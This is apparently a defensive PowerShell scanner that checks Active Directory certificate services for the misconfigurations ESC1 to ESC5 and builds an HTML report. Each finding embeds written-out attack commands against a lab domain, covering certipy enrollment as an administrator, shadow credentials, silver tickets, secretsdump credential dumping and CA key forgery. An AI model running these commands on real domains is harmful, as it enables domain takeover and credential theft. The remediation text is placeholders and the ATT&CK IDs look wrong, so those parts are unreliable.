function Invoke-ADScanner {
    <#
    .SYNOPSIS
    Scans Active Directory for common vulnerabilities and produces an intelligent report to support remediation of vulnerabilities.

    .DESCRIPTION
    Invoke-ADScanner primarily uses the Active Directory (AD) Powershell (PS) module to identify common and highly dangerous misconfigurations
    found in Enterprise Active Directory environments.

    .COMPONENT
    Invoke-ADScanner requires the AD & ADCS modules to be installed in the scope of the Current User. This will require the Remote System Administration
    Toolkit (RSAT) installed on the device. 
    If Locksmith does not identify RSAT installed, it will attempt to install the relevant modules, else will fail.

    .PARAMETER Scans
    Specify which scans you want to run. Available scans: 'All' or ADCS or Kerberos, or , or 'PromptMe'

    -Scans All
    Run all scans (default)

    -Scans PromptMe
    Presents a grid view of the available scan types that can be selected and run them after you click OK.

    .PARAMETER Domain
    Specify a domain to run the scan in to cater to more complex environments

    .PARAMETER OutputPath
    Specify the path where you want to save the report.

    .OUTPUTS
    Different report output types (compliance with different report formats):
    1. To console
    2. HTML

    .EXAMPLE 
    Invoke-ADScanner -Domain test.local -Scans All -Format html -OutputPath c:\temp\
    Invoke-ADScanner -Domain staging.test.local -Scans ADCS,Kerberos -Format csv -OutputPath c:\temp\

    #>

    [CmdletBinding()]
    Param(
        [Parameter()]
        [String]
        $Domain,
    
        [Parameter()]
        [String]
        $Scans = "All",

        [Parameter()]
        [Switch]
        $Help,

        [Parameter()]
        [String]
        $APIkey
    )    


    # Display help menu if ran incorrectly
    if (-not $Domain -or $Help) {
        Write-Host "Example Usage:  Invoke-ADScanner -Domain test.local -Scans All -Format html -OutputPath c:\temp\
            -Domain     The domain to scan. If don't know scanner will automatically use the current domain the system is joined to (Get-ADDomain)
            -Scans      The scan type to choose (Info, Kerberos, PKI, RBAC, ACLs, Passwords, MISC, Legacy (Default: All))
            -Format     The report format (console/html)
            -OutputPath The location to save the report
            -APIkey     The API key for ChatGPT to generate a summary of the report
    " 
        return
    }

    #Logo made with https://patorjk.com/software/taag/#p=display&f=Big&t=ADScanner
    $Logo = @"

    /\   |  __ \ / ____|                                
    /  \  | |  | | (___   ___ __ _ _ __  _ __   ___ _ __ 
   / /\ \ | |  | |\___ \ / __/ _` | '_ \| '_ \ / _ \ '__|
  / ____ \| |__| |____) | (_| (_| | | | | | | |  __/ |   
 /_/    \_\_____/|_____/ \___\__,_|_| |_|_| |_|\___|_|   

 [+] Version: 1.0.0 - 15/03/2024
 [+] Jack G (@rootjack) https://github.com/rootjaxk/ADScanner
                                                   
"@

    Write-Host $Logo -ForegroundColor Yellow

    #Colours for console output
    function to_red ($msg) {
        "$([char]0x1b)[91m$msg$([char]0x1b)[0m"
    }
    function to_yellow ($msg) {
        "$([char]0x1b)[93m$msg$([char]0x1b)[0m"
    }
    function to_cyan ($msg) {
        "$([char]0x1b)[36m$msg$([char]0x1b)[0m"
    }
    function to_green ($msg) {
        "$([char]0x1b)[92m$msg$([char]0x1b)[0m"
    }

    #Add a check to see if RSAT is installed, if not, say to install it before importing AD module
    function Test-RSAT-Installed {
        $RSAT = Get-WindowsFeature -Name RSAT-AD-PowerShell
        if ($RSAT.Installed -eq $true) {
            return $true
        }
        else {
            return $false
        }
    }
    #required for esc7 check
    function Test-RSATADCS-Installed {
        $RSAT = Get-WindowsFeature -Name RSAT-ADCS
        if ($RSAT.Installed -eq $true) {
            return $true
        }
        else {
            return $false
        }
    }
    function Test-PSPKI-Installed {
        $PSPKI = Get-Module -ListAvailable -Name PSPKI
        if ($PSPKI -eq $null) {
            return $false
        }
        else {
            return $true
        }
    }

    Write-Host "$((Get-Date).ToString(""[HH:mm:ss tt]"")) Checking pre-requisites..." -ForegroundColor Yellow

    if (Test-RSAT-Installed) {
        Import-Module ActiveDirectory
    }
    else {
        Write-Host "RSAT is not installed. Please install RSAT as an elevated user before running this script." -ForegroundColor Yellow
        Write-Host "Command: Install-WindowsFeature -Name RSAT-AD-PowerShell" -ForegroundColor Yellow #- only works on servers, on workstaions need to do Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0 -Online (see locksmith) - https://github.com/TrimarcJake/Locksmith/blob/main/Private/Install-RSATADPowerShell.ps1
        Write-Host "Command: Install-WindowsFeature -Name GPMC" -ForegroundColor Yellow         #For GPOs
        return
    }   
    
    if (-not (Test-RSATADCS-Installed)) {
        Write-Host "RSAT is not installed. Please install RSAT as an elevated user before running this script." -ForegroundColor Yellow
        Write-Host "Command: Install-WindowsFeature -Name RSAT-ADCS" -ForegroundColor Yellow
        return
    }

    if (Test-PSPKI-Installed) {
        Import-Module PSPKI
    }
    else {
        Write-Host "PSPKI is not installed. Please install PSPKI as an elevated user before running this script." -ForegroundColor Yellow
        Write-Host "Command: Install-Module -Name PSPKI -Force" -ForegroundColor Yellow
        return
    }   

    #TO-DO - add functionality to do individual scans (for prioritised remediation)

    #TD-DO - add functionality to exclude GPT (if executing in environment where outbound access is not permitted / privacy concerns)

    
    # Create variables to store the findings
    $DomainInfo = @()
    $Kerberos = @()
    $PKI = @()
    $RBAC = @()
    $ACLs = @()
    $Passwords = @()
    $MISC = @()
    $Legacy = @()

    #Perform vulnerability checks
    $startTime = Get-Date
    Write-Host "$((Get-Date).ToString(""[HH:mm:ss tt]"")) Starting scan of $domain..." -ForegroundColor Yellow

    # Domain info
    if ($Scans -eq "Info" -or $Scans -eq "All") {
        $DomainInfo += Find-DomainInfo -Domain $Domain
    }
    #Generate report
    $htmlreportheader = @"
    <html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>$Domain Vulnerability Report</title>
    <link rel="stylesheet" href="styles.css">
    <link rel="icon" type="image/x-icon" href="/Private/Report/Images/favicon-32x32.png">
</head>

<body>
    <div class="banner">
        <img src="./Images/kerberos-text2.png" alt="ADScanner logo" class="banner-img">
    </div>
    <div class="main-header">Domain vulnerability report for $Domain</div>
"@



    $CertificateTemplates = $domaininfo.CertificateTemplates -join ', '
    $CertificateAuthority = $domaininfo.CertificateAuthority -join ', '

    $DomainInfohtml = @"
<!-- Technical section -->
<div class="main-header">Technical section</div>
<div class="finding-header">Domain info</div>
<div class="domain-info">
<p>This section provides a general overview of the Active Directory domain, which can be taken as an indication of the size and complexity of the domain. Before appreciating any risks it is important to understand which assets within the domain require protecting.</p>
<table>
<th>Category</th>
<th>Value</th>
<tr><td class="grey">Domain:</td><td>$($domaininfo.Domain)</td></tr>
<tr><td class="grey">FunctionalLevel:</td><td>$($domaininfo.FunctionalLevel)</td></tr>
<tr><td class="grey">DomainControllers:</td><td>$($domaininfo.DomainControllers)</td></tr>
<tr><td class="grey">Users:</td><td>$($domaininfo.Users)</td></tr>
<tr><td class="grey">Groups:</td><td>$($domaininfo.Groups)</td></tr>
<tr><td class="grey">Computers:</td><td>$($domaininfo.Computers)</td></tr>
<tr><td class="grey">Trusts:</td><td>$($domaininfo.Trusts)</td></tr>
<tr><td class="grey">OUs:</td><td>$($domaininfo.OUs)</td></tr>
<tr><td class="grey">GPOs:</td><td>$($domaininfo.GPOs)</td></tr>
<tr><td class="grey">CertificateAuthority:</td><td>$CertificateAuthority</td></tr>
<tr><td class="grey">CAtemplates:</td><td>$($domaininfo.CAtemplates)</td></tr>
<tr><td class="grey">CertificateTemplates:</td><td>$CertificateTemplates</td></tr>
</table>
</div>
"@


    # PKI - ADCS
    if ($Scans -eq "ADCS" -or $Scans -eq "All") {
        $PKI += Find-ESC1 -Domain $Domain
        $PKI += Find-ESC2 -Domain $Domain 
        $PKI += Find-ESC3 -Domain $Domain
        $PKI += Find-ESC4 -Domain $Domain 
        $PKI += Find-ESC5 -Domain $Domain
        $PKI += Find-ESC6 -Domain $Domain
        $PKI += Find-ESC7 -Domain $Domain
        $PKI += Find-ESC8 -Domain $Domain
    }
    if(!$PKI){
        $PKIhtml = @"
        <div class="finding-header">PKI</div>
        <h2 class="novuln">No vulnerabilities found!</h2>
"@
    } else{
        $PKIhtml = @"
        <div class="finding-header">PKI</div>
        <div class="finding-container">
        <table>
            <thead>
                <tr>
                    <th class="table-header">Issue</th>
                    <th class="table-header">Risk</th>
                </tr>
            </thead>
            <tbody>
"@
        foreach ($finding in $PKI) {
            if($finding.Technique -eq "ESC1"){
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $PKIhtml += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-riskcritical">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in a vulnerable certificate template and supplying a SAN.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                                            <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC1 is a vulnerability where a certificate template permits Client Authentication and allows a low-privileged enrollee to supply a different username than their own using a Subject Alternative Name (SAN) without manager approval. 
                                            A SAN is an extension that allows multiple identities to be bound to a certificate beyond just the subject of the certificate. A common use for SANs is supplying additional host names for HTTPS certificates. For example, if a web server hosts content for multiple domains, each applicable domain could be included in the SAN so that the web server only needs a single HTTPS certificate instead of one for each domain. This is all well and good for HTTPS certificates, but when combined with certificates that allow for domain authentication, a dangerous scenario can arise.</p>
                                            <p>This allows a low-privileged user to enroll in $($finding.Name) supplying a SAN of Administrator, and then authenticate as the domain administrator.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy. 
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC1-1.png"
                                                        alt="Finding ESC1">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can enroll in the certificate template specifying a UPN of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC1-template -upn administrator@test.local -dns dc.test.local</p>
                                                    <p>The low-privileged user can then use this certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator_dc.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC1-2.png"
                                                        alt="Exploiting ESC1">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>Remove ability to supply SAN or restrict who can enroll in cert (to prviileged users only)</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@  
            }
            elseif($finding.Technique -eq "ESC2"){
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $PKIhtml += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-riskcritical">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in a vulnerable certificate template used for any purpose.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                                            <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC2 is a vulnerability where a certificate template can be used for ANY purpose for which a low-privileged user can enroll. Since the certificate can be used for any purpose, it can be used for the same technique as with ESC3 for most certificate templates. This invovles enrolling in the vulnerable certificate template, then using that enrolled certificate to enroll another certiifcate on behalf of another user (i.e a domain admin) permitted by the any purpose EKU.</p>
                                            <p>This allows a low-privileged user to enroll in $($finding.Name), then use the certificate to enroll in another certificate template on behalf of a domain admin (permitted as the certificate can be used for any purpose).</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/adcs-exploits-investigations-pt2/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy. 
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC2-1.png"
                                                        alt="Finding ESC1">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can enroll in the certificate template.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC2-template</p>
                                                    <p>The low-privileged user can then use the ANY purpose certificate to request a certificate in the "User" certificate template on behalf of a domain administrator</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template User -on-behalf-of 'test\administrator' -pfx test.pfx</p>
                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC2-2.png"
                                                        alt="Exploiting ESC1">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC2 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@ 
            }
            elseif($finding.Technique -eq "ESC3"){
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $PKIhtml += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-riskcritical">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can impersonate a domain administrator by enrolling in a vulnerable certificate template on behalf of another user.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                                            <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC3 is a vulnerability where a certificate template allows a low-privileged user to enroll for a certificate on behalf of another user by specifying the Certificate Request Agent EKU. This vulnerability is present when two certificate templates can be enrolled in by low privileged user, where, one allows the Certificate Request Agent EKU (to requesst certificate on behalf of other user) and another allows client authentication.</p>
                                            <p>This allows a low-privileged user to enroll in $($finding.Name), then use the certificate obtained to request an additional certificate (co-sign a Certificate Signing Request (CSR)) on behalf of a domain admin in another template used for client authentication to impersonate them.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://labs.lares.com/adcs-exploits-investigations-pt2/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy. 
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC3-1.png"
                                                        alt="Finding ESC3">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can enroll in the certificate template that permits enrolling on behalf of another user (ESC3-CRA - has the Certificate Request Agent EKU).</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC3-CRA</p>
                                                    <p>The low-privileged user can this obtained certificate to request a certificate in another template that allows authentication (ESC3-template) on behalf of a domain adminstator.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC3-template -on-behalf-of 'test\Administrator' -pfx test.pfx</p>
                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC3-2.png"
                                                        alt="Exploiting ESC3">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC3 remediation</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@
            }
            elseif($finding.Technique -eq "ESC4"){
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $PKIhtml += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-riskcritical">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users have unsafe permissions over a certificate template allowing impersonation of a domain administrator.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
"@
                    #Account for owner rights
                    if($finding.Issue -match "Owner"){
                        $PKIhtml += @"
                        <td class="relevantinfo"><table>
                        <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                        <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
                        <tr><td class="grey">Owner</td><td>$($finding.Owner)</td></tr>
                    </table></td>
                    <td class="explanation">
                                            <p>ESC4 is a vulnerability where low privileged users have unsafe permissions over a certificate template, giving them full control of the template. $($finding.Owner) has Owner rights over $($finding.Name), giving full control of the template.</p>
                                            <p>This allows a low-privileged user to modify $($finding.Name) to be vulnerable to ESC1, enroll and supply a SAN of Administrator, and then authenticate as the domain administrator.</p> 
"@
                    } else{
                        $PKIhtml += @"
                        <td class="relevantinfo"><table>
                        <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                        <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
                        <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                        <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                    </table></td>
                    <td class="explanation">
                                            <p>ESC4 is a vulnerability where low privileged users have unsafe permissions over a certificate template, giving them full control of the template. $($finding.IdentityReference) has $($finding.ActiveDirectoryRights) over $($finding.DistinguishedName), giving full control of the template.</p>
                                            <p>This allows a low-privileged user to modify $($finding.Name) to be vulnerable to ESC1, enroll and supply a SAN of Administrator, and then authenticate as the domain administrator.</p> 
"@
                    }
                    $PKIhtml += @"
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://redfoxsec.com/blog/exploiting-weak-acls-on-active-directory-certificate-templates-esc4/">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can remotely enumerate vulnerable certificate templates using certipy. 
                                                    </p>
                                                    <p class="code">python3 entry.py find -u test@test.local -p 'Password123!' -stdout -vulnerable</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC4-1.png"
                                                        alt="Finding ESC4">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. A low-privileged user can take the ESC4 template and change it to be vulnerable to ESC1 technique by using the unsafe permission over the template.</p>
                                                    <p class="code">python3 entry.py template -u test@test.local -p 'Password123!' -template ESC4ACL-template -save-old</p>
                                                    <p>The low-privileged user can then use the template to exploit ESC1, enroll in the modified certificate template specifying a UPN of a domain administrator in the SAN.</p>
                                                    <p class="code">python3 entry.py req -u test@test.local -p 'Password123!' -ca test-CA-CA -target ca.test.local -template ESC4ACL-Template -upn administrator@test.local</p>
                                                    <p>The low-privileged user can then use this domain admin certificate with PKINIT to authenticate as the domain administrator and obtain their NTLM hash, allowing full impersonation and domain privilege escalation.</p>
                                                    <p class="code">certipy auth -pfx administrator.pfx -dc-ip 192.168.10.141</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC4-2.png"
                                                        alt="Exploiting ESC4">
                                                </span>
                                            </div>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Remediation (GPT to contextualize)</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <p>ESC4 remediation - pki is tier 0 there should be no unsafe delegations on it</p>
                                            <p>run command 1</p>
                                            <p>run command 2</p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                        </div>
                    </td>
                </tr>
"@
            }
            elseif($finding.Technique -eq "ESC5"){
                $nospaceid = $finding.Technique.Replace(" ", "-")
                $PKIhtml += @"
                <tr>
                    <td class="toggle" id="$nospaceid"><u>$($finding.Technique)</u></td>
                    <td class="finding-riskcritical">$($finding.Risk)</td>
                </tr>
                <tr class="finding">
                    <td colspan="3">
                        <div class="finding-info">
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Issue</th>
                                        <th>MITRE ATT&CK ref</th>
                                        <th>Score</th>
                                    </tr>
                                    <tr>
                                        <td>Low-privileged users can take control of a certificate authority and craft certificates for a domain administrator.</td>
                                        <td>T-15940</td>
                                        <td>+$($finding.Score)</td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Relevant info</th>
                                        <th>Issue explanation</th>
                                    </tr>
                                    <tr>
                                        <td class="relevantinfo"><table>
                                            <tr><td class="grey">Template Name</td><td>$($finding.Name)</td></tr>
                                            <tr><td class="grey">DistinguishedName</td><td>$($finding.DistinguishedName)</td></tr>
                                            <tr><td class="grey">IdentityReference</td><td>$($finding.IdentityReference)</td></tr>
                                            <tr><td class="grey">ActiveDirectoryRights</td><td>$($finding.ActiveDirectoryRights)</td></tr>
                                        </table></td>
                                        <td class="explanation">
                                            <p>ESC5 is a vulnerability where a low privileged user has unsafe rights over PKI objects such as the CA object in AD. $($finding.IdentityReference) has $($finding.ActiveDirectoryRights) over $($finding.DistinguishedName), giving full control of the certificate authority, and the domain PKI which is a tier 0 asset (as important as a domain controller).</p>
                                            <p>Compromise of a certificate authority allows a user extract the CA private key and use it to forge authentication certificates for any user, allowing impersonation of a domain administrator.</p> 
                                            <p class="links"><b>Further information:</b></p>
                                            <p><a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2>">Link 1</a></p>
                                            <p><a href="https://luemmelsec.github.io/Skidaddle-Skideldi-I-just-pwnd-your-PKI/#esc5">Link 2</a></p>
                                        </td>
                                    </tr>
                                </tbody>
                            </table>
                            <table>
                                <tbody>
                                    <tr>
                                        <th>Attack explanation</th>
                                    </tr>
                                    <tr>
                                        <td>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>1. A low-privileged user can search for rogue permissions over CA objects using bloodhound.</p> 
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-1.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>2. With these permissions, the user can add shadow credentials to the CA object to obtain a certificate as the CA server.</p> 
                                                    <p class="code">python3 pywhisker.py -d test.local -u test -p 'Password123!' --target 'ca$' --action add --dc-ip dc.test.local</o>
                                                   
                                                    <p>With the shadow credentials updated a TGT for the CA can be requested</p>
                                                    <p class="code">python3 gettgtpkinit.py test.local/'ca$' -cert-pfx ../pywhisker/hguhjXMA.pfx -pfx-pass kE2JBsYrnlfjY1iXzZQn out.ccache</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-2.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>3. From the TGT h shadow credentials, the user can extract the NTLM hash of the certificate authority.</p> 
                                                    <p class="code">export KRB5CCNAME=out.ccache</p>                                                                                                                    
                                                    <p class="code">python3 getnthash.py -key 07df53520ac65b82c309918e26f8c4384086af39f6ff264809cb2c186b0162e9 test.local/'ca$'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-3.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>4. With the CA authority NTLM hash, a silver ticket can be crafted.</p> 
                                                    <p class="code">impacket-ticketer -domain-sid S-1-5-21-1189352953-3643054019-2744120995 -domain test.local -spn HOST/ca.test.local -nthash</p>

                                                    <p>The silver ticket can be used to dump credentials to extract a local administrator credentials to get admin access to the PKI.</p>
                                                    <p class="code">export KRB5CCNAME=Administrator.ccache</p>
                                                    <p class="code">impacket-secretsdump 'administrator'@ca.test.local -k -no-pass<p>

                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-4.png" alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
                                                <div class="attack-text">
                                                    <p>5. With admin access to the CA, the CA certificate and private key can be extracted with certipy.</p>
                                                    <p class="code">certipy ca -backup -ca 'test-CA-CA' -username administrator@ca.test.local -hashes :2b576acbe6bcfda7294d6bd18041b8fe</p>
                                                    
                                                    <p> The CA private key can then be used to craft a certificate for a domain administrator.</p>
                                                    <p class="code">certipy forge -ca-pfx test-CA-CA.pfx -upn administrator@test.local -subject 'CN=Administrator,CN=Users,DC=test,DC=local'</p>
                                                </div>
                                                <span class="image-cell">
                                                    <img src="/Private/Report/Images/PKI/ESC5-5.png"
                                                        alt="Finding ESC5">
                                                </span>
                                            </div>
                                            <hr>
                                            <div class="attack-container">
